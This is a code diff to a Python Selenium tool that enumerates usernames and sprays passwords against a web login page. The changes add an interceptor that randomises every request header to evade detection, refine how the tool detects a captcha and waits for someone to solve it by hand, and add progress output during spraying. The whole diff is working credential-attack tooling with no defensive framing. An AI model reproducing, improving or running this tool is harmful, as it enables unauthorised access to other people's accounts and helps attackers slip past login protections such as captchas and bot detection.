@@ -31,18 +31,11 @@ from time import sleep
 from urllib.parse import urlparse
 from argparse import ArgumentParser
 from collections import OrderedDict
-
-# Fake User-Agents
-from random_user_agent.user_agent import UserAgent
-from random_user_agent.params import (
-    SoftwareName,
-    HardwareType,
-    SoftwareType,
-    OperatingSystem,
-)
+from fake_headers import random_headers
 
 # Import selenium packages
-from selenium.webdriver import Chrome, Firefox, DesiredCapabilities
+from selenium.webdriver import DesiredCapabilities
+from seleniumwire.webdriver import Chrome, Firefox
 from selenium.common.exceptions import TimeoutException, WebDriverException
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
@@ -72,6 +65,14 @@ elements = {
     },
     "captcha": {"type": "XPATH", "value": '//*[@id="captchaimg"]'},
 }
+
+
+# Intercept requests to change headers
+def _interceptor(request):
+    new_headers = random_headers()
+    for k, v in new_headers.items():
+        request.headers[k] = v
+
 
 # Colorized output during run
 class text_colors:
@@ -111,18 +112,6 @@ class SlackWebhook:
 
 # General class to run automations
 class BrowserEngine:
-    # Set User-Agent rotator at the class level
-    software_names = [SoftwareName.CHROME.value, SoftwareName.FIREFOX.value]
-    software_types = [SoftwareType.WEB_BROWSER.value]
-    hardware_types = [HardwareType.COMPUTER.value]
-    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
-    ua_rotator = UserAgent(
-        software_names=software_names,
-        software_types=software_types,
-        hardware_types=hardware_types,
-        operating_systems=operating_systems,
-    )
-
     def __init__(self):
         self.driver = None
 
@@ -163,6 +152,9 @@ class BrowserEngine:
 
     def is_clickable(self, type_, value):
         return self.wait.until(EC.element_to_be_clickable((getattr(By, type_), value)))
+
+    def is_visible(self, element):
+        return self.wait.until(EC.visibility_of(element))
 
     def click(self, button):
         button.click()
@@ -215,10 +207,7 @@ class ChromeBrowserEngine(BrowserEngine):
         self.driver.set_window_position(0, 0)
         self.driver.set_window_size(1024, 768)
         if random_ua:
-            self.driver.execute_cdp_cmd(
-                "Network.setUserAgentOverride",
-                {"userAgent": self.ua_rotator.get_random_user_agent()},
-            )
+            self.driver.request_interceptor = _interceptor
 
         self.wait = WebDriverWait(self.driver, wait)
 
@@ -253,10 +242,7 @@ class FirefoxBrowserEngine(BrowserEngine):
         self.driver.set_window_position(0, 0)
         self.driver.set_window_size(1024, 768)
         if random_ua:
-            self.driver.execute_cdp_cmd(
-                "Network.setUserAgentOverride",
-                {"userAgent": self.ua_rotator.get_random_user_agent()},
-            )
+            self.driver.request_interceptor = _interceptor
 
         self.wait = WebDriverWait(self.driver, wait)
 
@@ -443,7 +429,7 @@ def enum(args, username_list):
         element = elements["captcha"]
         element_pwd = elements["password"]
         captcha = browser.find_element(element["type"], element["value"])
-        if captcha:
+        if captcha and browser.is_visible(captcha):
             need_interaction = True
             captcha_counter = 0
             while need_interaction and captcha_counter <= 60:
@@ -501,6 +487,7 @@ def spray(args, username_list, password_list):
 
         if args.shuffle:
             shuffle(username_list)
+        count_users = len(username_list)
         for useridx, username in enumerate(username_list):
 
             if counter >= args.reset_after:
@@ -513,7 +500,7 @@ def spray(args, username_list, password_list):
             if useridx > 0 and args.sleep > 0:
                 wait(args.sleep, args.jitter)
 
-            print("[*] Current username: %s" % username)
+            print("[*] Current username (%3d/%d): %s" % (useridx+1, count_users, username))
 
             counter += 1
 
@@ -564,23 +551,26 @@ def spray(args, username_list, password_list):
             if captcha:
                 need_interaction = True
                 captcha_counter = 0
-                while need_interaction and captcha_counter <= 60:
-                    print(
-                        "%s[Captcha Triggered] Solve it in %d seconds%s"
-                        % (text_colors.yellow, 60 - captcha_counter, text_colors.reset),
-                        end="\r",
-                    )
-                    sleep(2)
-                    captcha_counter += 2
-                    need_interaction = (
-                        False
-                        if browser.find_element(
-                            element_pwd["type"], element_pwd["value"]
+                try:
+                    while need_interaction and captcha_counter <= 10:
+                        print(
+                            "%s[Captcha Triggered] Solve it in %d seconds%s"
+                            % (text_colors.yellow, 10 - captcha_counter, text_colors.reset),
+                            end="\r",
                         )
-                        else True
-                    )
+                        sleep(2)
+                        captcha_counter += 2
+                        need_interaction = (
+                            False
+                            if browser.find_element(
+                                element_pwd["type"], element_pwd["value"]
+                            )
+                            else True
+                        )
+                except KeyboardInterrupt:
+                    pass
                 # No user interaction
-                if captcha_counter > 60:
+                if captcha_counter > 10:
                     print(
                         "%s[Invalid Captcha] %s%s"
                         % (text_colors.yellow, username, text_colors.reset)
